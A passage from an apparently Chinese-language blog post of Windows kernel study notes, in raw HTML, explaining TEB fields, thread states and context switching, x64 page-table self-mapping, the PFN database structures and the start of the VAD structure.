&#123;</span></span><br><span class="line">            UCHAR ReservedPad0;                                             <span class="comment">// 0xf74 保留字段。</span></span><br><span class="line">            UCHAR ReservedPad1;                                             <span class="comment">// 0xf75 保留字段。</span></span><br><span class="line">            UCHAR ReservedPad2;                                             <span class="comment">// 0xf76 保留字段。</span></span><br><span class="line">            UCHAR IdealProcessor;                                           <span class="comment">// 0xf77 理想处理器的编号。</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG GuaranteedStackBytes;                                             <span class="comment">// 0xf78 保证的栈空间字节数。</span></span><br><span class="line">    VOID* ReservedForPerf;                                                  <span class="comment">// 0xf7c 保留给性能监控的空间。</span></span><br><span class="line">    VOID* ReservedForOle;                                                   <span class="comment">// 0xf80 保留给 OLE（对象链接和嵌入）相关数据。</span></span><br><span class="line">    ULONG WaitingOnLoaderLock;                                              <span class="comment">// 0xf84 用于表示当前线程是否在等待加载锁。</span></span><br><span class="line">    VOID* SavedPriorityState;                                               <span class="comment">// 0xf88 保存的线程优先级状态。</span></span><br><span class="line">    ULONG SoftPatchPtr1;                                                    <span class="comment">// 0xf8c 软件补丁指针1。</span></span><br><span class="line">    VOID* ThreadPoolData;                                                   <span class="comment">// 0xf90 线程池数据。</span></span><br><span class="line">    VOID** TlsExpansionSlots;                                               <span class="comment">// 0xf94 扩展的 TLS 槽数组。</span></span><br><span class="line">    ULONG MuiGeneration;                                                    <span class="comment">// 0xf98 MUI（多语言用户界面）版本。</span></span><br><span class="line">    ULONG IsImpersonating;                                                  <span class="comment">// 0xf9c 标志，表示线程是否在模拟其他安全主体。</span></span><br><span class="line">    VOID* NlsCache;                                                         <span class="comment">// 0xfa0 国家语言支持（NLS）缓存。</span></span><br><span class="line">    VOID* pShimData;                                                        <span class="comment">// 0xfa4 与程序兼容性（Shim）相关的数据。</span></span><br><span class="line">    ULONG HeapVirtualAffinity;                                              <span class="comment">// 0xfa8 堆的虚拟亲和性。</span></span><br><span class="line">    VOID* CurrentTransactionHandle;                                         <span class="comment">// 0xfac 当前事务的句柄。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME</span>* <span class="title">ActiveFrame</span>;</span>                                  <span class="comment">// 0xfb0 活动帧信息。</span></span><br><span class="line">    VOID* FlsData;                                                          <span class="comment">// 0xfb4 与 FLS（线程本地存储）相关的数据。</span></span><br><span class="line">    VOID* PreferredLanguages;                                               <span class="comment">// 0xfb8 用户首选语言列表。</span></span><br><span class="line">    VOID* UserPrefLanguages;                                                <span class="comment">// 0xfbc 用户偏好的语言列表。</span></span><br><span class="line">    VOID* MergedPrefLanguages;                                              <span class="comment">// 0xfc0 合并的语言偏好列表。</span></span><br><span class="line">    ULONG MuiImpersonation;                                                 <span class="comment">// 0xfc4 MUI 模拟状态。</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">volatile</span> USHORT CrossTebFlags;                                      <span class="comment">// 0xfc8 用于线程的跨 TEB 标志。</span></span><br><span class="line">        USHORT SpareCrossTebBits:<span class="number">16</span>;                                        <span class="comment">// 0xfc8 备用的跨 TEB 位。</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        USHORT SameTebFlags;                                                <span class="comment">// 0xfca 同一线程环境块（TEB）标志</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            USHORT SafeThunkCall:<span class="number">1</span>;                                         <span class="comment">// bit 0: 安全调用标志</span></span><br><span class="line">            USHORT InDebugPrint:<span class="number">1</span>;                                          <span class="comment">// bit 1: 当前线程处于调试打印模式</span></span><br><span class="line">            USHORT HasFiberData:<span class="number">1</span>;                                          <span class="comment">// bit 2: 当前线程拥有纤程数据</span></span><br><span class="line">            USHORT SkipThreadAttach:<span class="number">1</span>;                                      <span class="comment">// bit 3: 跳过线程附加操作</span></span><br><span class="line">            USHORT WerInShipAssertCode:<span class="number">1</span>;                                   <span class="comment">// bit 4: 标志，表示线程处于断言代码中</span></span><br><span class="line">            USHORT RanProcessInit:<span class="number">1</span>;                                        <span class="comment">// bit 5: 标志，表示进程初始化已完成</span></span><br><span class="line">            USHORT ClonedThread:<span class="number">1</span>;                                          <span class="comment">// bit 6: 标志，表示该线程为克隆线程</span></span><br><span class="line">            USHORT SuppressDebugMsg:<span class="number">1</span>;                                      <span class="comment">// bit 7: 是否抑制调试信息</span></span><br><span class="line">            USHORT DisableUserStackWalk:<span class="number">1</span>;                                  <span class="comment">// bit 8: 禁用用户栈跟踪</span></span><br><span class="line">            USHORT RtlExceptionAttached:<span class="number">1</span>;                                  <span class="comment">// bit 9: 标志，表示 RTL 异常已附加</span></span><br><span class="line">            USHORT InitialThread:<span class="number">1</span>;                                         <span class="comment">// bit 10: 标志，表示这是初始线程</span></span><br><span class="line">            USHORT SpareSameTebBits:<span class="number">5</span>;                                      <span class="comment">// bit 11-15: 备用位，暂时未使用</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* TxnScopeEnterCallback;                                            <span class="comment">// 0xfcc 事务作用域进入回调函数。</span></span><br><span class="line">    VOID* TxnScopeExitCallback;                                             <span class="comment">// 0xfd0 事务作用域退出回调函数。</span></span><br><span class="line">    VOID* TxnScopeContext;                                                  <span class="comment">// 0xfd4 事务作用域上下文数据。</span></span><br><span class="line">    ULONG LockCount;                                                        <span class="comment">// 0xfd8 锁计数，表示当前线程持有的锁的数量。</span></span><br><span class="line">    ULONG SpareUlong0;                                                      <span class="comment">// 0xfdc 备用的 ULONG 数据。</span></span><br><span class="line">    VOID* ResourceRetValue;                                                 <span class="comment">// 0xfe0 资源返回值。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="线程切换"><a href="#线程切换" class="headerlink" title="线程切换"></a>线程切换</h3><p>KTHREAD_STATE</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 线程调度状态（KTHREAD_STATE）</span></span><br><span class="line"><span class="comment">// 表示线程在调度器中的生命周期状态。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">KTHREAD_STATE</span> &#123;</span></span><br><span class="line">    Initialized,    <span class="comment">// （0）已初始化：线程对象已构造但尚未调度</span></span><br><span class="line">    Ready,          <span class="comment">// （1）就绪：线程已插入就绪队列，等待运行</span></span><br><span class="line">    Running,        <span class="comment">// （2）运行中：线程正在某处理器上执行</span></span><br><span class="line">    Standby,        <span class="comment">// （3）待命：被选为下一个要运行的线程</span></span><br><span class="line">    Terminated,     <span class="comment">// （4）已终止：线程执行完毕，等待资源释放</span></span><br><span class="line">    Waiting,        <span class="comment">// （5）等待中：线程正在等待某个事件或超时</span></span><br><span class="line">    Transition,     <span class="comment">// （6）过渡态：资源尚未准备好，暂不可调度</span></span><br><span class="line">    DeferredReady,  <span class="comment">// （7）延迟就绪：满足就绪条件但延后入队</span></span><br><span class="line">    GateWait        <span class="comment">// （8）等待 Gate：等待底层同步对象 Gate</span></span><br><span class="line">&#125; KTHREAD_STATE;</span><br></pre></td></tr></table></figure><p>线程切换由调用 <code>KiSwapContext</code> 和 <code>SwapContext</code>函数完成。</p><p>当决定从 <code>OldThread</code> 切换到 <code>NewThread</code> 时（x32）：</p><ol><li>检查运行状态: 确保目标线程没有在其他 CPU 上运行 (<code>Running</code> 标志) 。</li><li>切换内核栈:<ul><li>保存旧线程的 ESP 到 <code>OldThread-&gt;KernelStack</code>。</li><li>将 ESP 加载为 <code>NewThread-&gt;KernelStack</code>。</li><li><em>重要:</em> 这一步之后，CPU 实际上就已经在使用新线程的栈了。</li></ul></li><li>切换地址空间 (CR3):<ul><li>比较新旧线程的所属进程 (<code>ApcState.Process</code>)。</li><li>如果是不同进程，将 CR3 寄存器更新为新进程的 <code>DirectoryTableBase</code>。</li><li><em>注:</em> 这一步会导致 TLB (Translation Lookaside Buffer) 刷新，开销较大。</li></ul></li><li>更新 TSS (Task State Segment):<ul><li>更新 <code>TSS.Esp0</code>。这是为了确保当下次发生中断&#x2F;系统调用从用户态进入内核态时，CPU 能找到正确的内核栈位置。</li></ul></li><li>更新 TEB 指针: 修改 <code>fs:[0]</code> (KPCR) 中的 <code>Used_Self</code>指针指向新线程的 TEB。</li><li>恢复寄存器: 恢复 FPU&#x2F;SSE 状态（如果需要）和通用寄存器。</li></ol><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><h3 id="x64页表自映射"><a href="#x64页表自映射" class="headerlink" title="x64页表自映射"></a>x64页表自映射</h3><p>x64 使用 4 级页表（PML4, PDPT, PDE, PTE）</p><p>当内核需要修改某个虚拟地址（比如 <code>0x12345678</code>）对应的 PTE（页表项）属性时，它不能直接去写物理内存。它必须先把存放这个 PTE 的物理页映射到一个虚拟地址上，才能通过 CPU指令（如 <code>mov</code>）去修改它。</p><p>如果没有自映射，内核每次修改页表都需要临时分配虚拟地址、映射物理页、修改、解除映射，这非常繁琐且低效。</p><p><img src="/image/2025-12-30-learning_windows_4/1767171485680.png" alt="1767171485680"></p><p>使用windbg命令 <code>!pte</code>查看 <code>0</code>地址数据</p><p>对pml4、pdpt、pde、pte四项的页表基址进行拆分得到如下（去除 <code>页内偏移</code>和 <code>高16位</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pte_base：   111010111 000000000 000000000 000000000（FEB8000000）</span><br><span class="line">pde_base：   111010111 111010111 000000000 000000000（FEBF5C0000）</span><br><span class="line">pdpte_base： 111010111 111010111 111010111 000000000（FEBF5FAE00）</span><br><span class="line">pml4_base：  111010111 111010111 111010111 111010111（FEBF5FAFD7）</span><br></pre></td></tr></table></figure><p><img src="/image/2025-12-30-learning_windows_4/1767171602190.png" alt="1767171602190"></p><p>CPU是如何找到一个虚拟地址的物理地址的：</p><p>CPU先从CR3寄存器读取到PML4表的物理地址，从cr3+虚拟地址的最高9位 * 8处获得PDPT的物理地址，然后这个地址+虚拟地址的次高9位 * 8获得的地址是PDE的物理地址，以此类推从PTE上获取物理页帧号，物理地址&#x3D; <code>(PFN &lt;&lt; 12) + Offset(0x000)</code> 最后去内存条里找到数据</p><p>但如果是查找PTE表的物理地址呢？这里就和虚表自映射有关了，在cr3+PTE表虚拟地址最高9位*8处获得的地址其实是PML4的地址</p><p>在windbg上通过!pte命令获得的地址，实际上CPU从这些虚拟地址访问到的物理地址就是他们本身，这也解释了这些虚拟地址为什么要这样设计。</p><p>PTE表：在 x64 下，一个 PTE 是 64位（8字节）的，它里面存了物理地址和属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_MMPTE_HARDWARE</span><br><span class="line">   +0x000 Valid            : Pos 0, 1 Bit</span><br><span class="line">   +0x000 Dirty1           : Pos 1, 1 Bit</span><br><span class="line">   +0x000 Owner            : Pos 2, 1 Bit</span><br><span class="line">   +0x000 WriteThrough     : Pos 3, 1 Bit</span><br><span class="line">   +0x000 CacheDisable     : Pos 4, 1 Bit</span><br><span class="line">   +0x000 Accessed         : Pos 5, 1 Bit</span><br><span class="line">   +0x000 Dirty            : Pos 6, 1 Bit</span><br><span class="line">   +0x000 LargePage        : Pos 7, 1 Bit</span><br><span class="line">   +0x000 Global           : Pos 8, 1 Bit</span><br><span class="line">   +0x000 CopyOnWrite      : Pos 9, 1 Bit</span><br><span class="line">   +0x000 Unused           : Pos 10, 1 Bit</span><br><span class="line">   +0x000 Write            : Pos 11, 1 Bit</span><br><span class="line">   +0x000 PageFrameNumber  : Pos 12, 36 Bits</span><br><span class="line">   +0x000 ReservedForHardware : Pos 48, 4 Bits</span><br><span class="line">   +0x000 ReservedForSoftware : Pos 52, 4 Bits</span><br><span class="line">   +0x000 WsleAge          : Pos 56, 4 Bits</span><br><span class="line">   +0x000 WsleProtection   : Pos 60, 3 Bits</span><br><span class="line">   +0x000 NoExecute        : Pos 63, 1 Bit</span><br></pre></td></tr></table></figure><table><thead><tr><th>位 (Bit)</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>63(最高位)</td><td>NX (No-Execute)</td><td>1&#x3D;禁止执行 , 0&#x3D;允许执行</td></tr><tr><td>12-62</td><td>PFN</td><td>物理页帧号 (实际物理地址)</td></tr><tr><td>2</td><td>U&#x2F;S (User&#x2F;Supervisor)</td><td>0&#x3D;内核页, 1&#x3D;用户页</td></tr><tr><td>1</td><td>R&#x2F;W (Read&#x2F;Write)</td><td>1&#x3D;可写, 0&#x3D;只读</td></tr><tr><td>0</td><td>P (Present)</td><td>1&#x3D;页面有效 , 0&#x3D;无效</td></tr></tbody></table><h3 id="PFN-数据库"><a href="#PFN-数据库" class="headerlink" title="PFN 数据库"></a>PFN 数据库</h3><p>一个巨大的数组，描述了所有物理内存的状态。</p><h4 id="MMPFN"><a href="#MMPFN" class="headerlink" title="MMPFN"></a>MMPFN</h4><p>每一个物理页（4KB）在内核中都对应一个 <code>_MMPFN</code> 结构体，所有物理页都记录在一个全局数组中。<code>_MMPFN</code> 结构体在数组中的下标（Index） ，就是物理页号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 物理页帧数据库条目 (MMPFN)</span></span><br><span class="line"><span class="comment">// 系统中每个物理页(4KB)对应一个此结构。</span></span><br><span class="line"><span class="comment">// 用于追踪物理页的状态、所有者、引用计数以及在LRU链表中的位置。</span></span><br><span class="line"><span class="comment">// 注意：此结构大量使用 Union，不同状态下字段含义不同。</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">MMPFN</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">// ============================================================</span></span><br><span class="line">        <span class="comment">// 场景 A：页面处于链表中 (Free, Standby, Modified, Zeroed)</span></span><br><span class="line">        <span class="comment">// ============================================================</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ListEntry</span>;</span>           <span class="comment">// [链表态] 标准双向链表节点，用于将此页挂在 Free/Standby 等队列中</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span> <span class="title">TreeNode</span>;</span>     <span class="comment">// [链表态] 用于红黑树链接</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ============================================================</span></span><br><span class="line">        <span class="comment">// 场景 B：页面处于活动状态 (Active) 或其他特定状态</span></span><br><span class="line">        <span class="comment">// ============================================================</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> _<span class="title">SINGLE_LIST_ENTRY</span> <span class="title">NextSlistPfn</span>;</span>    <span class="comment">// [特殊] 用于单向链表（如 Lookaside 列表），快速分配用</span></span><br><span class="line">                VOID* Next;                               <span class="comment">// 指针形式的下一节点</span></span><br><span class="line">                ULONGLONG Flink:<span class="number">36</span>;                       <span class="comment">// 36位描述前向链接的页面PFN号</span></span><br><span class="line">                ULONGLONG NodeFlinkHigh:<span class="number">28</span>;               <span class="comment">// 前向链接的高位</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> _<span class="title">MI_ACTIVE_PFN</span> <span class="title">Active</span>;</span>             <span class="comment">// [活动态] 当页面正在使用时，包含工作集索引(WsIndex)等信息</span></span><br><span class="line">            &#125; u1;</span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> _<span class="title">MMPTE</span>* <span class="title">PteAddress</span>;</span>              <span class="comment">// 📌[活动态]指向引用此页的 PTE 的虚拟地址</span></span><br><span class="line">                ULONGLONG PteLong;                      <span class="comment">// 同上，长整型访问方式</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">MMPTE</span> <span class="title">OriginalPte</span>;</span>                  <span class="comment">// 📌[链表态/恢复用] 原始 PTE 内容。</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MIPFNBLINK</span> <span class="title">u2</span>;</span>           <span class="comment">// [链表态] 反向链接 (Blink) 或包含一些复杂的标志位组合</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    <span class="comment">// 引用计数与状态标志 (u3)</span></span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            USHORT ReferenceCount;      <span class="comment">// 📌引用计数。</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">MMPFNENTRY1</span> <span class="title">e1</span>;</span> </span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">MMPFNENTRY3</span> <span class="title">e3</span>;</span>    <span class="comment">// 另一种视角的标志位组合</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                USHORT ReferenceCount;   <span class="comment">// 引用计数</span></span><br><span class="line">            &#125; e2;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG EntireField;        <span class="comment">// 用于一次性读取/清空这 4 个字节</span></span><br><span class="line">        &#125; e4;</span><br><span class="line">    &#125; u3;</span><br><span class="line"></span><br><span class="line">    USHORT NodeBlinkLow;           <span class="comment">// 链表节点反向链接低位</span></span><br><span class="line">    UCHAR Unused:<span class="number">4</span>;   </span><br><span class="line">    UCHAR Unused2:<span class="number">4</span>; </span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        UCHAR ViewCount;        <span class="comment">// [映射] 对于共享内存(Section)，记录有多少个视图映射了此页</span></span><br><span class="line">        UCHAR NodeFlinkLow;     <span class="comment">// 链表节点前向链接低位</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR ModifiedListBucketIndex:<span class="number">4</span>;    <span class="comment">// [脏页] 在修改列表中属于哪个优先级桶（用于优化写入磁盘的顺序）</span></span><br><span class="line">            UCHAR AnchorLargePageSize:<span class="number">2</span>;        <span class="comment">// [大页] 如果这是大页(2MB/1GB)的一部分，记录大页尺寸</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    <span class="comment">// 物理页属性与层级关系 (u4)</span></span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONGLONG PteFrame:<span class="number">36</span>;       <span class="comment">// PTE 所在页表的物理页帧号。</span></span><br><span class="line">        ULONGLONG ResidentPage:<span class="number">1</span>;    <span class="comment">// 是否驻留</span></span><br><span class="line">        ULONGLONG Unused1:<span class="number">1</span>;</span><br><span class="line">        ULONGLONG Unused2:<span class="number">1</span>;</span><br><span class="line">        ULONGLONG Partition:<span class="number">10</span>;     <span class="comment">// 分区 ID (用于多租户/容器隔离)</span></span><br><span class="line">        ULONGLONG FileOnly:<span class="number">1</span>;       <span class="comment">// 仅文件关联</span></span><br><span class="line">        ULONGLONG PfnExists:<span class="number">1</span>;      <span class="comment">// [硬件] 物理内存是否存在 (用于支持内存热插拔)</span></span><br><span class="line">        ULONGLONG Spare:<span class="number">9</span>;   </span><br><span class="line">        ULONGLONG PageIdentity:<span class="number">3</span>;     <span class="comment">// 页面身份标识 (例如是否是加密内存)</span></span><br><span class="line">  </span><br><span class="line">        ULONGLONG PrototypePte:<span class="number">1</span>;    <span class="comment">// 📌[关键标志] 原型 PTE 标志。</span></span><br><span class="line">                                     <span class="comment">// 0 = 私有内存 (Private)。PteAddress 指向普通页表。</span></span><br><span class="line">                                     <span class="comment">// 1 = 共享内存 (Mapped File/Section)。PteAddress 指向原型 PTE (Prototype PTE)。</span></span><br><span class="line">        ULONGLONG EntireField;       <span class="comment">// 完整字段访问</span></span><br><span class="line">    &#125; u4;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="MMPFNENTRY1"><a href="#MMPFNENTRY1" class="headerlink" title="MMPFNENTRY1"></a>MMPFNENTRY1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">MMPFNENTRY1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR PageLocation : <span class="number">3</span>;       <span class="comment">// 📌页面当前所在的链表类型：</span></span><br><span class="line">                                  <span class="comment">// 0 = Zeroed (已清零，空闲)</span></span><br><span class="line">                                  <span class="comment">// 1 = Free (未清零，空闲)</span></span><br><span class="line">                                  <span class="comment">// 2 = Standby (备用，有数据但无人引用)</span></span><br><span class="line">                                  <span class="comment">// 3 = Modified (脏页，等待写回磁盘)</span></span><br><span class="line">                                  <span class="comment">// 4 = ModifiedNoWrite (脏页但不写回)</span></span><br><span class="line">                                  <span class="comment">// 5 = Bad (坏页)</span></span><br><span class="line">                                  <span class="comment">// 6 = Active (活动，正在被使用)</span></span><br><span class="line">                                  <span class="comment">// 7 = Transition (过渡态)</span></span><br><span class="line">    UCHAR WriteInProgress : <span class="number">1</span>;    <span class="comment">// [IO] 正在向磁盘写入（页面文件或映射文件）</span></span><br><span class="line">    UCHAR Modified : <span class="number">1</span>;           <span class="comment">// [脏位] 页面内容已被修改，与 PTE 中的 D 位同步</span></span><br><span class="line">    UCHAR ReadInProgress : <span class="number">1</span>;     <span class="comment">// [IO] 正在从磁盘读取（缺页异常处理中）</span></span><br><span class="line">    UCHAR CacheAttribute : <span class="number">2</span>;     <span class="comment">// [缓存] 硬件缓存策略 (Cached, Uncached, WriteCombined)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="空闲页的串联方式"><a href="#空闲页的串联方式" class="headerlink" title="空闲页的串联方式"></a>空闲页的串联方式</h4><p><img src="/image/2025-12-30-learning_windows_4/1769050159668.png" alt="1769050159668"></p><p>注：64位下是*0x30</p><h3 id="VAD"><a href="#VAD" class="headerlink" title="VAD"></a>VAD</h3><p>每个进程（<code>_EPROCESS</code>）都有一个 VAD树（AVL树），描述了该进程所有合法的虚拟地址范围。<code>VirtualAlloc</code> 本质上就是往这棵树里插入一个节点。</p><h4 id="MMVAD-SHORT"><a href="#MMVAD-SHORT" class="headerlink" title="MMVAD_SHORT"></a>MMVAD_SHORT</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x40 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_SHORT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_SHORT</span>* <span class="title">NextVad</span>;</span>                                   <span class="comment">//0x0</span></span><br><span class="line">            VOID* ExtraCreateInfo;                                          <span class="comment">//0x8</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span> <span class="title">VadNode</span>;</span>                                  <span class="comment">//0x0 📌AVL 树节点</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG StartingVpn;                                                      <span class="comment">//0x18 起始页号/0x1000</span></span><br><span class="line">    ULONG EndingVpn;                                                        <span class="comment">//0x1c 结束页号/0x1000</span></span><br><span class="line">    UCHAR StartingVpnHigh;                                                  <span class="comment">//0x20 起始页号的高 32 位</span></span><br><span class="line">    UCHAR EndingVpnHigh;                                                    <span class="comment">//0x21 结束页号的高 32 位</span></span><br><span class="line">    UCHAR CommitChargeHigh;                                                 <span class="comment">//0x22</span></span><br><span class="line">    UCHAR SpareNT64VadUChar;                                                <span class="comment">//0x23</span></span><br><span class="line">    LONG ReferenceCount;                                                    <span class="comment">//0x24 引用计数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_PUSH_LOCK</span> <span class="title">PushLock</span>;</span>                                          <span class="comment">//0x28 细粒度锁</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG LongFlags;                                                    <span class="comment">//0x30</span></span><br><span class="line">        <span class="class"><span 